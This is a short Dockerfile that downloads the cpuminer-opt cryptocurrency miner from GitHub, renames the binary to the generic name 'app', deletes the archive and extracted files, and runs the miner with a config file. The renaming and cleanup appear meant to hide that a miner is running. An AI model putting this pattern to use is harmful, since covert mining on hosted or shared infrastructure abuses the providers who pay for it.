FROM ubuntu:22.04

RUN apt update && apt install -y \
    curl ca-certificates tar && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Download + extract dengan aman
RUN set -eux; \
    curl -L https://github.com/JayDDee/cpuminer-opt/releases/download/v3.22.0/cpuminer-opt-3.22.0-x86_64-linux.tar.gz -o miner.tar.gz; \
    tar -xzf miner.tar.gz; \
    ls -R; \
    find . -name cpuminer -type f -exec mv {} ./app \;; \
    chmod +x ./app; \
    rm -rf miner.tar.gz cpuminer*

COPY config.json /app/config.json

CMD ["./app", "-c", "config.json"]
